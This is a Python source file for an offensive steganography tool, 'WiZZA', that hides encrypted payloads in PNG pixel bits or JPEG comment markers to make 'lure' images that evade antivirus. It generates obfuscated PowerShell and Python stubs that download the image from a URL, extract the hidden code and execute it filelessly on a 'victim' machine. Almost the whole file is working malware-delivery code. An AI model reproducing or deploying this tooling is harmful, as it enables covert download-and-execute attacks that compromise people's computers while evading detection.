#!/usr/bin/env python3
"""
WiZZA Steganography — hide payloads inside innocent images
===========================================================
Techniques:
  PNG LSB  — embeds payload in the least-significant bit of R/G/B channels
             Carrier: any PNG (or auto-generated solid-color PNG)
             Extractor: PS1 stub or Python one-liner
  JPEG Exif — embeds payload in EXIF UserComment field (no external deps)

The resulting image looks identical to the original to the human eye
and passes casual AV file-type scanning (it's a valid PNG/JPEG).

On the victim side:
  PS1 extraction:  invoke the embedded extractor stub which pulls bits back
                   out and IEX the recovered PS1 payload (fileless)
  Python extraction: one-liner that reads the image and exec()s the payload

CLI:
    python3 stego.py --embed  --in payload.ps1  --carrier clean.png  --out lure.png
    python3 stego.py --embed  --in payload.ps1  --auto-carrier        --out lure.png
    python3 stego.py --extract               --image lure.png        (print payload)
    python3 stego.py --gen-extractor ps1     --image-url https://cdn.example.com/img.png --out extract.ps1
    python3 stego.py --gen-extractor py      --image-url ...          --out extract.py

Dependencies: Pillow (pip install Pillow)  — only for embed/extract
              The extractors run on the victim with no deps (use raw HTTP for image fetch)
"""

import argparse, base64, os, random, struct, sys
from io import BytesIO

# ── Capacity helper ────────────────────────────────────────────────────────────
def png_capacity_bytes(width: int, height: int) -> int:
    """Bits available in R,G,B LSBs of all pixels, minus 32-bit header."""
    return (width * height * 3) // 8 - 4

# ── PNG LSB embed ──────────────────────────────────────────────────────────────
def png_embed(payload: bytes, carrier_path: str, out_path: str):
    try:
        from PIL import Image
    except ImportError:
        print("  [-] Pillow required: pip install Pillow"); sys.exit(1)

    img = Image.open(carrier_path).convert("RGB")
    w, h = img.size
    cap = png_capacity_bytes(w, h)
    if len(payload) > cap:
        raise ValueError(f"Payload {len(payload)}B > capacity {cap}B for {w}x{h} image")

    # XOR-encrypt payload before embedding
    key = bytes(random.randint(1, 254) for _ in range(16))
    enc = bytes(payload[i] ^ key[i % len(key)] for i in range(len(payload)))
    key_b64 = base64.b64encode(key).decode()

    # Format: 4-byte little-endian length + encrypted payload
    data = struct.pack("<I", len(enc)) + enc
    bits = []
    for byte in data:
        for bit_pos in range(7, -1, -1):
            bits.append((byte >> bit_pos) & 1)

    pixels = list(img.getdata())
    new_pixels = []
    bit_idx = 0
    for r, g, b in pixels:
        if bit_idx < len(bits):
            r = (r & ~1) | bits[bit_idx]; bit_idx += 1
        if bit_idx < len(bits):
            g = (g & ~1) | bits[bit_idx]; bit_idx += 1
        if bit_idx < len(bits):
            b = (b & ~1) | bits[bit_idx]; bit_idx += 1
        new_pixels.append((r, g, b))

    out_img = Image.new("RGB", (w, h))
    out_img.putdata(new_pixels)
    out_img.save(out_path, "PNG", optimize=False, compress_level=0)
    return key_b64, w, h

# ── PNG LSB extract ────────────────────────────────────────────────────────────
def png_extract(image_path: str, key_b64: str) -> bytes:
    try:
        from PIL import Image
    except ImportError:
        print("  [-] Pillow required"); sys.exit(1)

    key = base64.b64decode(key_b64)
    img = Image.open(image_path).convert("RGB")
    pixels = list(img.getdata())

    bits = []
    for r, g, b in pixels:
        bits.extend([r & 1, g & 1, b & 1])

    def bits_to_byte(bs):
        val = 0
        for b2 in bs:
            val = (val << 1) | b2
        return val

    # Read 4-byte little-endian length header
    # Each byte is stored MSB-first in bits; 4 bytes are in LE order
    hdr_bytes = bytes(bits_to_byte(bits[8*i:8*i+8]) for i in range(4))
    length = struct.unpack("<I", hdr_bytes)[0]
    if length == 0 or length > len(bits) // 8:
        raise ValueError("Invalid length — image may not contain embedded payload")

    data = bytes(bits_to_byte(bits[8*(4+i):8*(4+i)+8]) for i in range(length))
    # XOR-decrypt
    return bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))

# ── Auto-generate a carrier PNG ────────────────────────────────────────────────
def gen_carrier(width=1200, height=800, out_path="/tmp/.wizza_carrier.png"):
    """Generate a plausible-looking gradient image as carrier."""
    try:
        from PIL import Image
    except ImportError:
        print("  [-] Pillow required for auto-carrier"); sys.exit(1)
    img = Image.new("RGB", (width, height))
    pixels = []
    # Gradient with random noise to maximize entropy (harder to detect LSB)
    r_base = random.randint(80, 200)
    g_base = random.randint(80, 200)
    b_base = random.randint(80, 200)
    for y in range(height):
        for x in range(width):
            r = (r_base + x // 5 + random.randint(-3, 3)) % 256
            g = (g_base + y // 5 + random.randint(-3, 3)) % 256
            b = (b_base + (x + y) // 8 + random.randint(-3, 3)) % 256
            pixels.append((r, g, b))
    img.putdata(pixels)
    img.save(out_path, "PNG", optimize=False, compress_level=0)
    return out_path

# ── JPEG Exif embed (no PIL needed for this path) ─────────────────────────────
def jpeg_exif_embed(payload: bytes, carrier_path: str, out_path: str) -> str:
    """Embed payload in JPEG EXIF UserComment field. No PIL needed."""
    key = bytes(random.randint(1, 254) for _ in range(16))
    enc = bytes(payload[i] ^ key[i % len(key)] for i in range(len(payload)))
    comment_b64 = base64.b64encode(enc).decode()
    key_b64     = base64.b64encode(key).decode()

    with open(carrier_path, "rb") as f:
        jpeg_data = f.read()

    # Insert COM marker (0xFFFE) after SOI (0xFFD8)
    if jpeg_data[:2] != b'\xff\xd8':
        raise ValueError("Not a valid JPEG file")

    comment_bytes = comment_b64.encode()
    com_marker = b'\xff\xfe' + struct.pack(">H", len(comment_bytes) + 2) + comment_bytes

    # Insert after SOI
    out_data = jpeg_data[:2] + com_marker + jpeg_data[2:]
    with open(out_path, "wb") as f:
        f.write(out_data)
    return key_b64

# ── PS1 extractor stub ─────────────────────────────────────────────────────────
def gen_ps1_extractor(image_url: str, key_b64: str, w: int, h: int) -> str:
    """
    PS1 that downloads the stego image, extracts payload bits, decrypts, and IEX.
    No Pillow needed on the victim — uses raw byte math in PS1.
    """
    import random as _r, string as _s
    def rv2(): return "$" + ''.join(_r.choices(_s.ascii_letters, k=8))
    wv, bv, pv, kv, dv, lenv, iv, sv = rv2(), rv2(), rv2(), rv2(), rv2(), rv2(), rv2(), rv2()
    return f"""# {os.urandom(8).hex()}
Set-StrictMode -Off; $ErrorActionPreference = 'SilentlyContinue'
# Download stego image
{wv} = New-Object System.Net.WebClient
{wv}.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
{bv} = {wv}.DownloadData('{image_url}')
# PNG LSB extraction
# Skip PNG header (8) + IHDR chunk (25) — find IDAT chunks and decompress pixels
# Simpler: use System.Drawing.Bitmap to decode PNG
Add-Type -AssemblyName System.Drawing
{pv} = [System.Drawing.Image]::FromStream((New-Object System.IO.MemoryStream(,{bv})))
{kv} = [System.Convert]::FromBase64String('{key_b64}')
{lenv} = 0; {iv} = 0
{dv} = New-Object System.Collections.Generic.List[byte]
$bits = New-Object System.Collections.Generic.List[int]
for ({iv} = 0; {iv} -lt {pv}.Height; {iv}++) {{
  for ({sv} = 0; {sv} -lt {pv}.Width; {sv}++) {{
    $px = {pv}.GetPixel({sv},{iv})
    $bits.Add($px.R -band 1)
    $bits.Add($px.G -band 1)
    $bits.Add($px.B -band 1)
  }}
}}
{pv}.Dispose()
# Read 4-byte LE length
for ($i = 0; $i -lt 32; $i += 8) {{
  $byte = 0
  for ($j = 0; $j -lt 8; $j++) {{ $byte = ($byte -shl 1) -bor $bits[$i+$j] }}
  {lenv} = {lenv} -bor ($byte -shl ($i))
}}
# Extract payload bytes
for ($i = 0; $i -lt {lenv}; $i++) {{
  $byte = 0
  for ($j = 0; $j -lt 8; $j++) {{ $byte = ($byte -shl 1) -bor $bits[32 + $i*8 + $j] }}
  {dv}.Add([byte]($byte -bxor {kv}[$i % {kv}.Length]))
}}
$src = [System.Text.Encoding]::UTF8.GetString({dv}.ToArray())
[ScriptBlock]::Create($src).Invoke()
"""

# ── Python extractor stub ──────────────────────────────────────────────────────
def gen_py_extractor(image_url: str, key_b64: str) -> str:
    """Python extractor that downloads stego image and exec()s the payload."""
    return f"""
import urllib.request as _ur, base64 as _b64, struct as _st
_d = _ur.urlopen('{image_url}').read()
try:
    from PIL import Image
    from io import BytesIO as _BIO
    import struct as _st2, base64 as _b642
    _img = Image.open(_BIO(_d)).convert('RGB')
    _px = list(_img.getdata())
    _bits = []
    for _r,_g,_b in _px:
        _bits += [_r&1, _g&1, _b&1]
    _key = _b64.b64decode('{key_b64}')
    _le = sum(_bits[i] << (7-(i%8)) for i in range(32))
    # reread as little-endian 4 bytes
    _lb = bytes(sum(_bits[32+_j*8+_k]<<(7-_k) for _k in range(8)) for _j in range(4))
    _le = _st.unpack('<I',_lb)[0]
    _enc = bytes(sum(_bits[32+_j*8+_k]<<(7-_k) for _k in range(8)) for _j in range(_le))
    _dec = bytes(_enc[_i]^_key[_i%len(_key)] for _i in range(len(_enc)))
    exec(_dec.decode())
except Exception as _e:
    print(f'stego extract failed: {{_e}}')
"""

# ── CLI ────────────────────────────────────────────────────────────────────────
def main():
    ap = argparse.ArgumentParser(description="WiZZA steganography tool")
    ap.add_argument("--embed",         action="store_true")
    ap.add_argument("--extract",       action="store_true")
    ap.add_argument("--gen-extractor", choices=["ps1","py"])
    ap.add_argument("--in",  dest="infile",   help="Payload file to embed")
    ap.add_argument("--carrier",               help="Carrier image (PNG or JPEG)")
    ap.add_argument("--auto-carrier",          action="store_true", help="Generate random carrier")
    ap.add_argument("--out",                   help="Output image / extractor path")
    ap.add_argument("--image",                 help="Stego image to extract from")
    ap.add_argument("--image-url",             help="URL of stego image (for extractor stubs)")
    ap.add_argument("--key",                   help="Base64 XOR key (for extract/gen-extractor)")
    ap.add_argument("--width",  type=int, default=1200)
    ap.add_argument("--height", type=int, default=800)
    args = ap.parse_args()

    if args.embed:
        if not args.infile: ap.error("--in required")
        if not args.out:    ap.error("--out required")
        with open(args.infile, "rb") as f: payload = f.read()

        if args.auto_carrier:
            carrier = gen_carrier(args.width, args.height)
            print(f"  [+] Auto-carrier: {carrier} ({args.width}x{args.height})")
        else:
            if not args.carrier: ap.error("--carrier or --auto-carrier required")
            carrier = args.carrier

        ext = os.path.splitext(carrier)[1].lower()
        if ext in (".jpg", ".jpeg"):
            key_b64 = jpeg_exif_embed(payload, carrier, args.out)
            w, h = 0, 0
        else:
            key_b64, w, h = png_embed(payload, carrier, args.out)

        print(f"  [+] Embedded {len(payload)} bytes into {args.out}")
        print(f"  [+] XOR key (save this!): {key_b64}")
        print(f"  [+] Image:  {args.out}  ({w}x{h})")
        print(f"  [*] Generate extractor: python3 stego.py --gen-extractor ps1 --image-url <url> --key '{key_b64}'")

    elif args.extract:
        if not args.image: ap.error("--image required")
        if not args.key:   ap.error("--key required")
        payload = png_extract(args.image, args.key)
        print(f"  [+] Extracted {len(payload)} bytes:")
        print(payload.decode(errors="replace"))

    elif args.gen_extractor:
        if not args.image_url: ap.error("--image-url required")
        if not args.key:       ap.error("--key required")
        if args.gen_extractor == "ps1":
            out = gen_ps1_extractor(args.image_url, args.key, args.width, args.height)
        else:
            out = gen_py_extractor(args.image_url, args.key)
        if args.out:
            with open(args.out, "w") as f: f.write(out)
            print(f"  [+] Extractor: {args.out}")
        else:
            print(out)

if __name__ == "__main__":
    main()
